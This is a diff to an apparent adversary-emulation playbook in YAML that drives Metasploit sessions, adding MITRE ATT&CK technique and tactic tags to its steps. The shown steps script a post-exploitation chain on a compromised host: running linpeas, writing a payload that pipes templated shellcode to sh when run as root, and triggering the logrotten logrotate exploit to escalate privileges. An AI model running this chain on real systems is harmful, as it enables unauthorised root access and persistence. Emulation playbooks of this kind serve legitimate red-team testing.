@@ -81,18 +81,30 @@ commands:
   - type: msf-session
     cmd: export SHELL=bash
     session: "foothold"
+    metadata:
+      techniques: "T1574,T1104"
+      tactics: "Persistence,Privilege Escalation,Defense Evasion"
  
   - type: msf-session
     cmd: export TERM=xterm256-color
     session: "foothold"
+    metadata:
+      techniques: "T1574,T1104"
+      tactics: "Persistence,Privilege Escalation,Defense Evasion"
  
   - type: msf-session
     cmd: stty rows 38 columns 116
     session: "foothold"
+    metadata:
+      techniques: "T1574,T1104"
+      tactics: "Persistence,Privilege Escalation,Defense Evasion"
 
   - type: msf-session
     cmd: 'export PS1="PWN >"'
     session: "foothold"
+    metadata:
+      techniques: "T1574,T1104"
+      tactics: "Persistence,Privilege Escalation,Defense Evasion"
 
   - type: msf-session
     cmd: chmod +x linpeas.sh
@@ -121,29 +133,50 @@ commands:
   - type: msf-session
     cmd: "cd /var/www/default"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: echo "if [ \`id -u\` -eq 0 ]; then \$( {{shellcode3333.stdout}} | sh ); fi" > payload
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "rm -rf log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "mkdir log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "echo empty > log/accesss.log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "./logrotten -p /var/www/default/payload /var/www/default/log/accesss.log"
     session: "foothold"
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: sleep
     seconds: 960
+    metadata:
+      techniques: "T1546"
+      tactics: " Privilege Escalation,Persistence"
 
   - type: msf-session
     cmd: "id"
